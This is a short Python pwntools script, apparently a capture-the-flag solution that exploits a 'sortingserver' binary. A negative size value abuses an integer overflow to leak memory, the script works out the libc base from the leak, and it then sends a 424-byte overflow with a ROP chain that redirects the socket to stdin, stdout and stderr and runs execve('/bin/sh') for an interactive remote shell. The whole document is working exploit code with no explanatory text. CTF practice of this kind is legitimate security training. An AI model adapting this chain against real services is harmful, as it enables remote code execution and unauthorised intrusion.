#!/usr/bin/env python3

from pwn import *
from math import ceil

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./sortingserver")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")
context.binary = exe

# api = gdb.debug(exe.path, 'set schedule-multiple on\nset detach-on-fork off\nset follow-fork-mode parent\nc\nb* 0x555555555565', api=True)
host = '127.0.0.1'
port = 1337
#host = 'pwn.1nf1n1ty.team'
#port = 30648 
# host = '0.tcp.in.ngrok.io'
# port = 19213
def send_payload(payload):
    n = ceil(len(payload)/4)
    io.sendlineafter(b': ', str(-2147483648+n).encode())
    io.recvline()
    for i in range(n):
        if payload[i*4:i*4+4] == b'****':
            temp = b'\x00\x00\x00\x00'
        else:
            temp = str(unpack(payload[i*4:i*4+4], 'all')).encode() 
        io.send(temp+b'\x00'*(24-len(temp)))
        sleep(0.1)
    
io = remote(host, port)

# leak addresses
send_payload(b'*'*100)
io.recvuntil(b'Result: ')
leak = io.recvline().decode()
leak = list(map(int, leak.strip().split()))
leaks = []
for u,v in zip(leak[::2], leak[1::2]):
    packed_u = struct.pack('<i', u) 
    packed_v = struct.pack('<i', v) 
    leaks.append(struct.unpack('<Q', packed_u + packed_v)[0])

print(*map(hex, leaks))
libc.address = leaks[3]-0x1d75c0     

print(hex(libc.address))
# ret2system
io = remote(host, port)
rop = ROP(libc)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.dup2(4, 2)
rop.execve(next(libc.search(b'/bin/sh\x00')), 0, 0)
print(rop.chain())

send_payload(b'a'*424+b'*'*8+b'a'*24+rop.chain())
io.interactive()
